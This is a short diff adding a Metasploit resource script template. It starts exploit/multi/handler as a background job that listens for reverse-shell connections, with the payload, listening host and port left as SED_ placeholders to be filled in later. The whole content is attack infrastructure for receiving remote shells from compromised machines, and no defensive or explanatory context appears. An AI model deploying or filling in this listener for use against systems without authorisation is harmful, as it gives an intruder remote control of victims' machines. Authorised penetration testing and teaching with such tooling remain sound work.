@@ -1,0 +1,7 @@
+use exploit/multi/handler
+set PAYLOAD SED_REVERSE_SHELL
+set LHOST SED_LHOST
+set LPORT SED_LPORT
+set ExitOnSession false
+exploit -j -z
+
